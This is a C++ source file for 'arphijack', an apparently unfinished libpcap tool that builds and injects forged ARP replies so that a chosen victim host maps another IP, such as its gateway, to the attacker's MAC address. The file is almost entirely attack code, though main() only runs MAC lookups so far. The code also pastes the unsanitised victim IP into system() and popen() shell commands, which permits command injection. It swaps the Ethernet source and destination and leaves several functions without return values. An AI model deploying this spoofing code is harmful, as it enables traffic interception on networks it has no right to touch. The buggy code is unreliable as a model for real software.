#include <cstdlib>
#include <cstring>
#include <string>
#include <map>
#include <vector>

#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>

using namespace std;

namespace
{
    char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
    
    u_char  g_myMAC[ETH_ALEN] = {0};
    u_char  g_victimMAC[ETH_ALEN] = {0};
    u_char  g_gatewayMAC[ETH_ALEN] = {0};
    in_addr g_victimIP;
    in_addr g_gatewayIP;
};

#define MY_ASSERT(expr) \
    if (!(expr)) \
    { \
        printf("Assertion failed: %s\n", #expr); \
        return EXIT_FAILURE; \
    }

typedef struct
{
    u_int16_t   hardwareType;		    /* Format of hardware address.  */
    u_int16_t   protocolType;		    /* Format of protocol address.  */
    u_int8_t    hardwareSize;		    /* Length of hardware address.  */
    u_int8_t    protocolSize;		    /* Length of protocol address.  */
    u_int16_t   opcode;		            /* ARP opcode (command).  */
    u_int8_t    senderMAC[ETH_ALEN];	/* Sender hardware address.  */
    u_int16_t   senderIP[2];		    /* Sender IP address.  */ 
    u_int8_t    targetMAC[ETH_ALEN];	/* Target hardware address.  */
    u_int16_t   targetIP[2];		    /* Target IP address.  */
} ARPPacket;

#define COPY_OR_ZERO(dest, src, len) \
    if (src) \
        memcpy(dest, src, len); \
    else \
        memset(dest, 0, len);

#define MAC_FORMAT "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"

inline void mac_aton(const char* str, u_char mac[ETH_ALEN])
{
    sscanf(str, MAC_FORMAT, &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

inline void mac_ntoa(const u_char mac[ETH_ALEN], char* str)
{
    sprintf(str, MAC_FORMAT, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

#define GREP_MAC "grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"

int GetMACFromConsoleOutput(const char* cmd, u_char macAddr[ETH_ALEN])
{
    char cmdWithGrep[100] = {0};
    sprintf(cmdWithGrep, "%s | %s", cmd, GREP_MAC);
    
    FILE* pPipe = popen(cmdWithGrep, "r");
    MY_ASSERT(pPipe);
    
    char pEntryBuf[19] = {0};
    if (fgets(pEntryBuf, sizeof(pEntryBuf)-1, pPipe))
        mac_aton(pEntryBuf, macAddr);
    
    pclose(pPipe);
    return 0;
}

typedef map< string, vector<u_char> > arp_map_t;

int GetMACForIP(const char* ip, u_char macAddr[ETH_ALEN])
{
    static arp_map_t mapARPCache;
    
    arp_map_t::const_iterator it = mapARPCache.find(ip);
    if (it != mapARPCache.end())
    {
        memcpy(macAddr, &(it->second.front()), ETH_ALEN * sizeof(u_char));
        return 0;
    }
    
    //This is to make sure there will be ARP entry for the IP
    //TODO: Is this actually necessary?
    char cmd[100] = {0};
    sprintf(cmd, "ping -c1 %s > NIL", ip);
    system(cmd);

    memset(cmd, 0, sizeof(cmd));
    sprintf(cmd, "arp -a -n | grep %s", ip);
    int nRet = GetMACFromConsoleOutput(cmd, macAddr);
    
    mapARPCache[ip].resize(ETH_ALEN);
    memcpy(&(mapARPCache[ip].front()), macAddr, ETH_ALEN * sizeof(u_char));
    return 0;
}

int GetMACForDevice(const char* dev, u_char macAddr[ETH_ALEN])
{
    char cmd[100] = {0};
    sprintf(cmd, "ifconfig %s | grep %s", dev, dev);
    return GetMACFromConsoleOutput(cmd, macAddr);
}

int GetDefaultGateway(in_addr* pGatewayAddr)
{
    FILE* pPipe = popen("/sbin/ip route | awk '/default/ {print $3}'", "r");
    MY_ASSERT(pPipe);
    
    char pIPAddrBuf[16] = {0};
    if (fgets(pIPAddrBuf, sizeof(pIPAddrBuf)-1, pPipe))
        inet_aton(pIPAddrBuf, pGatewayAddr);
    
    pclose(pPipe);
    return 0;
}

void WriteARP(u_char* pPacket,
              unsigned int& nPos,
              bool bRequest,
              const u_char* pSenderMAC,
              const char* szSenderIP,
              const u_char* pTargetMAC,
              const char* szTargetIP)
{
    ARPPacket* pARP = reinterpret_cast<ARPPacket*>(pPacket+nPos);
    
    pARP->hardwareType  = htons(0x0001);
    pARP->protocolType  = htons(0x0800);
    pARP->hardwareSize  = 0x06;
    pARP->protocolSize  = 0x04;
    pARP->opcode        = htons(bRequest?0x0001:0x0002);
    
    COPY_OR_ZERO(pARP->senderMAC, pSenderMAC, ETH_ALEN * sizeof(u_char));
    
    in_addr senderAddr;
    inet_aton(szSenderIP, &senderAddr);
    memcpy(pARP->senderIP, &senderAddr, sizeof(in_addr));
    
    COPY_OR_ZERO(pARP->targetMAC, pTargetMAC, ETH_ALEN * sizeof(u_char));
    
    in_addr targetAddr;
    inet_aton(szTargetIP, &targetAddr);
    memcpy(pARP->targetIP, &targetAddr, sizeof(in_addr));
    
    nPos += sizeof(ARPPacket);
}             
    
void WriteEthernet(u_char* pPacket,
                   unsigned int& nPos,
                   const u_char* pSrc,
                   const u_char* pDst)
{
    ether_header* pEth = reinterpret_cast<ether_header*>(pPacket+nPos);
    
    COPY_OR_ZERO(pEth->ether_dhost, pDst, ETH_ALEN * sizeof(u_char));
    COPY_OR_ZERO(pEth->ether_shost, pSrc, ETH_ALEN * sizeof(u_char));
    pEth->ether_type = htons(ETHERTYPE_ARP);
    
    nPos += sizeof(ether_header);
}

int CreateARPPacket(bool bRequest,
                    const u_char* pSenderMAC,
                    const string& szSenderIP,
                    const u_char* pTargetMAC,
                    const string& szTargetIP,
                    u_char** pOutPacket, uint16_t& uOutPacketSize)
{
    try
    {
        u_int16_t uPacketSize = sizeof(ether_header) + sizeof(ARPPacket);
        u_char* pPacket = new u_char[uPacketSize+1];
        MY_ASSERT(pPacket);
        memset(pPacket, 0, (uPacketSize+1) * sizeof(u_char));
        
        unsigned int nOutPos=0;
        
        WriteEthernet(pPacket, nOutPos,
                      pTargetMAC,
                      g_myMAC);
        
        WriteARP(pPacket, nOutPos,
                 bRequest,
                 pSenderMAC,
                 szSenderIP.c_str(),
                 pTargetMAC,
                 szTargetIP.c_str());
                 
        *pOutPacket = pPacket;
        uOutPacketSize = uPacketSize;
    }
    catch (...)
    {
        printf("Exception occurred in %s\n", __FUNCTION__);
        return -2;
    }
}

int InjectARPPacket(pcap_t* handle,
                    bool bRequest,
                    const u_char* pSenderMAC,
                    const string& szSenderIP,
                    const u_char* pTargetMAC,
                    const string& szTargetIP)
{
    u_char* pARPPacket = NULL;
    u_int16_t uPacketSize = 0;
    CreateARPPacket(bRequest, pSenderMAC, szSenderIP, pTargetMAC, szTargetIP, &pARPPacket, uPacketSize);
    
    pcap_inject(handle, reinterpret_cast<void*>(pARPPacket), uPacketSize);
    
    printf("ARP packet injected.\n");
}

inline int ClaimIPAsOwn(pcap_t* handle,
                        const string& szIPToClaim,
                        const string& szDestIP)
{
    u_char destMac[ETH_ALEN];
    GetMACForIP(szDestIP.c_str(), destMac);
    return InjectARPPacket(handle, false, g_myMAC, szIPToClaim, destMac, szDestIP);
}

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        printf("Usage: arphijack [victim-ip] [options]\n");
        printf("Options:\n");
        printf("-d --device [dev]\n");
        printf("  Listen to the [dev]. If not specified, will listen to a device with traffic.\n");
        printf("-g --gateway [ip-addr]\n");
        printf("  Treat [ip-addr] as the gateway. If not specified, will try to auto-detect.\n");
        return EXIT_FAILURE;
    }
    
    const char* szVictimIP = argv[1];
    const char* szDevice   = NULL;
    
    for (uint8_t i=2; i<argc; i++)
    {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--device") == 0)
            szDevice = argv[++i];
    }

    if (!szDevice)
        szDevice = pcap_lookupdev(g_szLastErr);
        
    MY_ASSERT(szDevice);
    printf("Listening on %s\n", szDevice);
    printf("Victim: %s\n", szVictimIP);
    
    in_addr defaultGateway;
    GetDefaultGateway(&defaultGateway);
    printf("Default Gateway: %s\n", inet_ntoa(defaultGateway));
    
    bpf_u_int32 net;
    bpf_u_int32 mask;
    MY_ASSERT(pcap_lookupnet(szDevice, &net, &mask, g_szLastErr) != -1);
    
    pcap_t* handle = pcap_open_live(szDevice, BUFSIZ, 1, -1, g_szLastErr);
    MY_ASSERT(handle);
    
    /* Test code */
    
    u_char macAddr[ETH_ALEN] = {0};
    GetMACForIP(szVictimIP, macAddr);
    
    char macAddrStr[18] = {0};
    mac_ntoa(macAddr, macAddrStr);
    printf("victim MAC address=[%s]\n", macAddrStr);
    
    GetMACForDevice(szDevice, g_myMAC);
    
    char myMACStr[18] = {0};
    mac_ntoa(g_myMAC, myMACStr);
    printf("my MAC address=[%s]\n", myMACStr);
    
    /* END Test code */
    
    return 0;
}

